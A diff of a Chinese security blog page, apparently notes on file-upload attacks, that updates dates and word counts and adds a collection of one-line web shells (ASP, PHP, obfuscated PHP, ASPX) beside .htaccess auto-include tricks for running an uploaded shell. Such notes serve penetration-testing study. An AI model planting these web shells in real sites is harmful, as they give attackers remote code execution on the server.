@@ -403,14 +403,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-16
+                    2023-07-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    531
+                    608
                 </div>
                 
 
@@ -474,6 +474,22 @@ SetHandler application/x-httpd-php
  
 //意思就是当前目录中的php文件的页头会自动去包含shell.jpg中的文件内容
 //auto_append_file 是页尾包含
+</code></pre>
+<h4 id="一句话木马收集"><a href="#一句话木马收集" class="headerlink" title="一句话木马收集"></a>一句话木马收集</h4><p>ASP一句话木马：</p>
+<pre><code>&lt;% execute(request(&quot;value&quot;)) %&gt;
+</code></pre>
+<p>PHP一句话木马：</p>
+<pre><code>&lt;?php @eval($_POST[&#39;value&#39;]); ?&gt;
+</code></pre>
+<p>变形后的PHP一句话木马：</p>
+<pre><code>&lt;?php
+  $x = $_GET[&#39;z&#39;];
+  @eval(&quot;$x;&quot;);
+?&gt;
+</code></pre>
+<p>ASPX一句话木马：</p>
+<pre><code>&lt;%@ Page Language=&quot;Jscript&quot; %&gt;
+&lt;% eval(Request.Item[&quot;value&quot;]) %&gt;
 </code></pre>
 
                 
@@ -778,7 +794,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">97.7k</span>
+                        class="white-color">100.2k</span>
             
             
             
